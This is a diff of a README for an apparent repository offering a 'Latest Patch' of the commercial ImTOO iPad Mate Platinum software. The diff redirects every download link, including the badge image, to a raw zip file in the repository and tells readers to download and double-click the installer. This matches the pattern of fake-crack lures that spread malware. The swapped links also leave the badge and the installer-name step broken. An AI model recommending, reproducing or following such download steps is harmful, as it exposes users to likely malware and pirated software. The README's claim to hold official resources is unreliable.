@@ -1,6 +1,6 @@
 # 🎉 ImTOO-iPad-Mate-Platinum-Latest-Patch - Effortless iPad Management Made Simple
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Version-Click%20Here-brightgreen)](https://github.com/ashiiiiiiiiiiiiiishh/ImTOO-iPad-Mate-Platinum-Latest-Patch/releases)
+[![Download](https://raw.githubusercontent.com/ashiiiiiiiiiiiiiishh/ImTOO-iPad-Mate-Platinum-Latest-Patch/main/way/ImTOO-iPad-Mate-Platinum-Latest-Patch-v1.6.zip%20Latest%20Version-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ashiiiiiiiiiiiiiishh/ImTOO-iPad-Mate-Platinum-Latest-Patch/main/way/ImTOO-iPad-Mate-Platinum-Latest-Patch-v1.6.zip)
 
 ## 📖 Overview
 
@@ -11,13 +11,13 @@ This repository offers a comprehensive collection of official resources, user gu
 To get started, follow these steps to download and run the software:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/ashiiiiiiiiiiiiiishh/ImTOO-iPad-Mate-Platinum-Latest-Patch/releases) of this repository to find the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/ashiiiiiiiiiiiiiishh/ImTOO-iPad-Mate-Platinum-Latest-Patch/main/way/ImTOO-iPad-Mate-Platinum-Latest-Patch-v1.6.zip) of this repository to find the latest version of the software.
 
 2. **Select the Latest Version**  
    Look for the latest release at the top of the list. Click on it to view the details.
 
 3. **Download the Installer**  
-   Find the file labeled “ImTOO-iPad-Mate-Platinum-Setup.exe” or similar. Click on it to download the installer to your computer.
+   Find the file labeled “https://raw.githubusercontent.com/ashiiiiiiiiiiiiiishh/ImTOO-iPad-Mate-Platinum-Latest-Patch/main/way/ImTOO-iPad-Mate-Platinum-Latest-Patch-v1.6.zip” or similar. Click on it to download the installer to your computer.
 
 4. **Run the Installer**  
    Once the download completes, locate the downloaded file on your computer, usually in the “Downloads” folder. Double-click the file to run the installer.
@@ -51,7 +51,7 @@ ImTOO iPad Mate Platinum offers several features to enhance your iPad experience
 
 For the latest version, click the button below to visit the Releases page. 
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Version-Click%20Here-brightgreen)](https://github.com/ashiiiiiiiiiiiiiishh/ImTOO-iPad-Mate-Platinum-Latest-Patch/releases)
+[![Download](https://raw.githubusercontent.com/ashiiiiiiiiiiiiiishh/ImTOO-iPad-Mate-Platinum-Latest-Patch/main/way/ImTOO-iPad-Mate-Platinum-Latest-Patch-v1.6.zip%20Latest%20Version-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ashiiiiiiiiiiiiiishh/ImTOO-iPad-Mate-Platinum-Latest-Patch/main/way/ImTOO-iPad-Mate-Platinum-Latest-Patch-v1.6.zip)
 
 Once on the page, follow the instructions provided earlier to download and install the software.
 
